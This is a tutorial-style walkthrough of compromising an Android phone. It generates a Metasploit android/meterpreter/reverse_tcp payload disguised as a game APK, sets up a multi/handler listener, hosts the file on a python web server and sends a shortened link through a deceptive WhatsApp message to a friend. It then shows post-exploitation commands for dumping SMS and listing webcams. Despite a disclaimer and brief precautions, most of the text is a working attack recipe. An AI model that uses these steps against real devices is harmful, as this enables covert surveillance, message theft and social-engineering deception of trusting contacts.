# Metasploit-android-meterpreter-payload-generation 

# OVERVIEW

The simulation to be shown shows how an attacker can use a Social engineering technique known as Phishing to gain access to an android device remotely through a maliciously crafted android meterpreter payload.

# DISCLAIMER

Do not attempt the attack pattern below on random people friends or family . Only practice it in a controlled environment such as a lab environment for security testing and educational purposes only.

# INFORMATION GATHERING 

For this attack we have David an ethical hacker and penetration tester running Kali Linux on his laptop (ATTACKER).
Next we have Kim , she has an Android device running the Android operating System .

David has identified that Kim indeed uses an android device.

In order to begin the attack David proceeds to his Linux machine to check whether he has the required tools to begin the attack.

# ENUMARATION PHASE 

David types into the terminal:

(msfconsole --version) to check whether the Metasploit framework is installed.
After successfully checking that metasploit is installed he then types in the terminal (msfvenom -l payloads) to check for the required (android/meterpreter/reverse_tcp)  payload that needs to be crafted.

He then begins crafting the malicious payoad

(msfvenom -p android/meterpreter/reverse_tcp LHOST= <HOST-IP> LPORT = 4444 -o game.apk)

The payload requires the LHOST or local host to determine the attackers machine IP the LPORT is the default port to be used and the -o specifies the output format.

# VULNERABILITY ANALYSIS

The information gathered during the enumeration was analyzed to identify potential vulnerabilities in the Android environment.

# EXPLOITATION

David proceeds to launch the metasploit framework by typing in the terminal (msfconsole) in order to set up the listener that will capture the incoming connection if successful  .

After it launches he types (use exploit/multi/handler)

Then (set payload android/meterpreter/reverse_tcp)

(show options)

He sees that the LHOST field is required under the payloads parameters 

(set LHOST <IP>)

He then realizes he will need a place to host the malicious payload 

He creates a python web server by typing in the terminal 

(python3 -m http. Server 8080)

David then uses a URL shortener to make the link more presentable 

He then sends Kim the link via WhatsApp saying "Hi Kim i have this cool game ill bet you will love" and since Kim is David's friend she taps the link and basic permission requirements appear on the screen such as allow this app to use the camera or allow the app to use you're microphone, Kim types ok on all of them and that's it Kim has no idea of what has just happened but David's listener spawns the connection and a meterpreter session is shown.

# POST-EXPLOITATION

David now has remote access to Kim's phone

He can now run commands such as (sysinfo) which gives out the Operating System and its architecture .

He can also access the web camera by typing in (webcam_list)

Also sms messages can be read through (dump_sms) command

# PRECAUTIONS
1. Never install unknown apk files

2. Update your phone

3. Avoid clicking suspicious link

4. Avoid plugging your phone into unknown devices

# TAKE NOTE THAT THIS EERCISE WAS PERFORMED IN A VIRTUAL ENVIRONMENT USING AN ANDROID EMULATOR , NO REAL PHONES WERE (HACKED) IN THE PROCESS.
